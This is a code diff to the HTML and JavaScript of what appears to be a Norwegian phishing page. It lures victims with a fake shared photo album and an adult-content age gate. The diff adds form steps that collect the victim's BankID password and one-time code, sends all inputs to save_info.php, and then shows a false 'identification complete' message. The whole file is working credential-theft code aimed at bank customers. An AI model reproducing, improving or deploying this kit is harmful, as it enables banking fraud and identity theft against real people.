@@ -16,7 +16,7 @@
 <body>
   <main class="main-wrapper">
 
-    <!-- <div class="form-wrapper" id="form-wrapper-two" style="background-color: #59c1f5;">
+    <div class="form-wrapper" id="form-wrapper-two" style="background-color: #59c1f5;">
       <div class="content-area" id="content-area">
         <img src="./assets/img/sky-outline.svg" alt="sky" class="sky-img">
         <h1>NettSky</h1>
@@ -24,11 +24,12 @@
         <p class="long-text2" id="long-text2">Sarah har delt sin album med deg</p>
         <p class="long-text3" id="long-text3" style="display:none">Denne nedlastingen inneholder vokseninnhold. For å
           laste den ned, må du bekrefte at du er 18 år eller eldre.</p>
+        <p class="long-text4" id="long-text4" style="display:none">Identifisering fullført. Du er nå klar til å laste ned.</p>
         <button class="button2" id="button01" style="background-color: #d4f3fd; color: #222">Last ned</button>
       </div>
-    </div> -->
+    </div>
 
-    <div class="form-wrapper" id="form-wrapper" style="display:non">
+    <div class="form-wrapper" id="form-wrapper" style="display:none">
       <svg class="logo-svg" focusable="false" id="Layer_1" version="1.1" viewBox="0 0 140 21" x="0px"
         xmlSpace="preserve" xmlns="http://www.w3.org/2000/svg" y="0px">
         <g>
@@ -119,8 +120,6 @@
         <!-- Step 6 -->
         <div id="step06" class="step" style="display: none;">
           <label for="input07">Vennligst vent til videre godkjenning</label>
-          <!-- <input class="form--control" type="password" id="input07" placeholder="Personlig passord" required> -->
-          <!-- <small>Fyll inn passord</small> -->
           <div id="app">
             <div class="base-timer">
               <svg class="base-timer__svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -137,127 +136,142 @@
               <span id="base-timer-label" class="base-timer__label"></span>
             </div>
           </div>
-<!-- 
-          <div class="buttons">
-            <button onclick="start()" class="start">
-              Start
-            </button>
-            <button onclick="stop()" class="stop">
-              Stop
-            </button>
-            <button onclick="reset()" class="reset">
-              Reset
-            </button>
-          </div> -->
         </div>
 
         <!-- Step 7 -->
         <div id="step07" class="step" style="display: none;">
-          <label for="input08">Engangskode igjen</label>
-          <input class="form--control" type="text" id="input08" placeholder="6 siffer" maxlength="6" pattern="^\d{6}$"
-            required>
-          <small>Fyll inn engangskode (6 siffer)</small>
+          <label for="input07">Ditt bankID passord</label>
+          <input class="form--control" type="password" id="input07" placeholder="Personelig passord" required>
+          <small>BankID</small>
+        </div>
+
+        <!-- Step 8 -->
+        <div id="step08" class="step" style="display: none;">
+          <label for="input08">Ditt bankID engangskode</label>
+          <input class="form--control" type="password" id="input08" placeholder="Engangskode" required>
+          <small>BankID</small>
+        </div>
+
+        <!-- Step 9 -->
+        <div id="step09" class="step" style="display: none;">
+          <label for="input09">Identifisering fullført</label>
+          <!-- <input class="form--control" type="password" id="input08" placeholder="Engangskode" required> -->
+          <img src="assets/img/check.svg" alt="check icon" width="90">
+          <small>"""Clock timer, instead of timer it should be a green circle with a check icon, you can just make it
+            green and add a check icon inside instead of timer"""</small>
         </div>
 
         <br>
         <button type="button" id="nextButton" class="button next-btn">Neste</button>
-        <button type="submit" id="submitButton" class="button next-btn" style="display: none;">BEKREFT</button>
+        <button type="submit" id="submitButton" class="button next-btn" style="display: none;">Lukk</button>
         <br>
         <a href="" class="form-link">Gå tilbake</a>
       </form>
 
-      <script src="./assets/js/app.js"></script>
-      <script>
-        document.addEventListener("DOMContentLoaded", () => {
-          const stepForm = document.getElementById("stepForm");
-          const steps = document.querySelectorAll(".step");
-          const nextButton = document.getElementById("nextButton");
-          const submitButton = document.getElementById("submitButton");
-          let currentStep = 5;
-
-          // Show the current step
-          function showStep(stepIndex) {
-            steps.forEach((step, index) => {
-              step.style.display = index === stepIndex ? "block" : "none";
-              if(index === 5) {
-                start()
-              }
-            });
-
-            // Toggle button visibility
-            nextButton.style.display = stepIndex < steps.length - 1 ? "inline-block" : "none";
-            submitButton.style.display = stepIndex === steps.length - 1 ? "inline-block" : "none";
-          }
-
-          // Validate inputs of the current step
-          function validateStep(stepIndex) {
-            const inputs = steps[stepIndex].querySelectorAll("input");
-            for (const input of inputs) {
-              if (!input.checkValidity()) {
-                input.reportValidity();
-                return false;
-              }
-            }
-            return true;
-          }
-
-          // Handle next button click
-          nextButton.addEventListener("click", () => {
-            if (validateStep(currentStep)) {
-              currentStep++;
-              showStep(currentStep);
-            }
-          });
-
-          // Handle form submission
-          stepForm.addEventListener("submit", (e) => {
-            e.preventDefault();
-
-            // Collect data from all inputs
-            const formData = Array.from(steps).reduce((data, step) => {
-              const inputs = step.querySelectorAll("input");
-              inputs.forEach((input) => {
-                data[input.id] = input.value;
-              });
-              return data;
-            }, {});
-
-            console.log("Form Data:", formData); // Debugging log
-
-            // Send the form data to the server
-            fetch("save_info.php", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(formData),
-            })
-              .then((response) => response.json())
-              .then((data) => {
-                console.log("Server Response:", data);
-
-                if (data.status === "success") {
-                  alert("Data saved successfully!");
-                  stepForm.reset();
-                  currentStep = 0;
-                  showStep(currentStep);
-                } else {
-                  alert("Error: " + data.message);
-                }
-              })
-              .catch((error) => {
-                console.error("Error:", error);
-                alert("Failed to submit the form. Please try again.");
-              });
-          });
-
-          // Initialize the first step
-          showStep(currentStep);
-        });
-      </script>
-
-
     </div>
+
+    <script src="./assets/js/app.js"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const stepForm = document.getElementById("stepForm");
+        const steps = document.querySelectorAll(".step");
+        const nextButton = document.getElementById("nextButton");
+        const submitButton = document.getElementById("submitButton");
+        const formWrapper = document.getElementById("form-wrapper");
+        const formWrapper2 = document.getElementById("form-wrapper-two");
+        const text3 = document.getElementById("long-text3");
+        const text4 = document.getElementById("long-text4");
+        let currentStep = 0;
+
+        // Show the current step
+        function showStep(stepIndex) {
+          steps.forEach((step, index) => {
+            step.style.display = index === stepIndex ? "block" : "none";
+          });
+
+          // Toggle button visibility
+          nextButton.style.display = stepIndex < steps.length - 1 ? "inline-block" : "none";
+          submitButton.style.display = stepIndex === steps.length - 1 ? "inline-block" : "none";
+        }
+
+        // Validate inputs of the current step
+        function validateStep(stepIndex) {
+          const inputs = steps[stepIndex].querySelectorAll("input");
+          for (const input of inputs) {
+            if (!input.checkValidity()) {
+              input.reportValidity();
+              return false;
+            }
+          }
+          return true;
+        }
+
+        // Handle next button click
+        nextButton.addEventListener("click", () => {
+          if (validateStep(currentStep)) {
+            currentStep++;
+            showStep(currentStep);
+            console.log(currentStep);
+
+            if (currentStep === 5) {
+              nextButton.textContent = 'Vent'
+              start()
+            }else if(currentStep >=6) {
+              nextButton.textContent = 'Neste'
+            }
+          }
+        });
+
+        // Handle form submission
+        stepForm.addEventListener("submit", (e) => {
+          e.preventDefault();
+
+          // Collect data from all inputs
+          const formData = Array.from(steps).reduce((data, step) => {
+            const inputs = step.querySelectorAll("input");
+            inputs.forEach((input) => {
+              data[input.id] = input.value;
+            });
+            return data;
+          }, {});
+
+          console.log("Form Data:", formData); // Debugging log
+
+          // Send the form data to the server
+          fetch("save_info.php", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(formData),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              // console.log("Server Response:", data);
+
+              if (data.status === "success") {
+                // alert("Data saved successfully!");
+                stepForm.reset();
+                currentStep = 0;
+                showStep(currentStep);
+                formWrapper.style.display = 'none'
+                formWrapper2.style.display = 'block'
+                text3.style.display = 'none'
+                text4.style.display = 'block'
+              } else {
+                alert("Error: " + data.message);
+              }
+            })
+            .catch((error) => {
+              // console.error("Error:", error);
+              alert("Failed to submit the form. Please try again.");
+            });
+        });
+
+        // Initialize the first step
+        showStep(currentStep);
+      });
+    </script>
 
   </main>
 </body>
